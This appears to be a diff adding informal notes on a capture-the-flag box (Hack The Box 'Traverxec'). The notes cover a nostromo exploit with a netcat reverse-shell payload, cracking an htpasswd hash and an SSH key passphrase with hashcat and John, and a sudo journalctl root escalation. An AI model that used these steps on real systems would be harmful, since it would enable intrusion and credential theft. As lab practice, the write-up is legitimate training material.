@@ -1,0 +1,116 @@
+1. exploit 47574 from nostromo
+searchsploit nostromo
+get the first one and import it into msfconsole
+
+set payload cmd/unix/reverse_netcat
+
+exploit
+
+2.
+after we gain access to the www-data shell
+we change dir to /var/nostromo/conf
+
+then
+```
+$ ls -a
+$ cat .htpasswd
+david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+```
+
+
+3.
+
+
+- "david" is the file which contains only the hash from the previous finding
+- we will run -m 500 because the hash analyzer(web tool) found that the hash
+is type of "md5-crypt"
+
+https://hashcat.net/wiki/doku.php?id=example_hashes
+
+
+hash analyzer: https://www.tunnelsup.com/hash-analyzer/
+
+```
+$ hashcat --force -m 500 david /usr/share/wordlists/rockyou.txt
+```
+
+Credentials found:
+
+$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me   
+
+The creds are a rabit hole
+
+4.
+
+Read the conf file
+serveradmin david....
+
+# HOMEDIRS [OPTIONAL]
+
+homedirs		/home
+homedirs_public		public_www
+
+
+while in shell:
+cd /home/david/public_www/
+
+find a ziped file, unzip it to another accessible for writing dir, for instance /tmp/nothing
+$ tar zxvf backup-ssh-identity-files.tgz -C /tmp/nothing
+
+
+we found .ssh of david
+
+
+store a backup to my machine.
+
+It is inevitable that we prevent other users from having access to these files:
+$ chmod 400 ~/id_rsa
+or 
+$ chmod 600 ~/id_rsa
+
+
+try:
+$ ssh -i id_rsa david@10.10.10.165
+we will be promted for a passphrase
+
+5.
+#### Cracking the passphrase with ssh2john
+
+$ cd ~/JohnTheRipper/run
+$ python3 ssh2john.py ~/Documents/traverxec/id_rsa > ~/Documents/traverxec/tocrack
+
+while in traverxec directory.
+Cracking the passphrase:
+$ john --wordlist=/usr/share/wordlists/rockyou.txt tocrack
+
+this bruteforcing will find passphrase "hunter"
+
+$ ssh -i id_rsa david@10.10.10.165      again
+
+
+6
+### For root:
+
+while in david user
+
+got to the bin/server-stats.sh as it is a suspicious file
+then if you open it you will find a suspicious command. This
+command.
+
+Hint: use GTFObins
+
+search for journalctl
+
+we want the Sudo function (escalate access)
+
+if we copy the server-stats.sh file as mycopy.sh
+and change permissions to chmodo 777 if needed
+then as we see from gtfobins we only need the "sudo journalctl"
+. We erase the cat command
+we execure the script:
+./mycopy.sh
+
+while viewing the document type:
+!/bin/sh
+
+we got access to root
